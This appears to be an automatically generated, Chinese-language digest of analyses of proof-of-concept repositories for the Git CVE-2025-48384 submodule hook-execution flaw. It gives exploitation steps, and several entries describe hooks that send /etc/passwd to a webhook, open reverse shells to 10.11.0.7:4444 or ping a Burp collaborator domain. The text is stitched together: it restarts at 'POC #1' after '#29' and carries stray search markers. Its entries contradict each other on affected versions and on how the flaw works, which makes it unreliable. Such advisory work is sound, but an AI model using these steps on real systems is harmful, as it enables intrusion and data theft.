**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

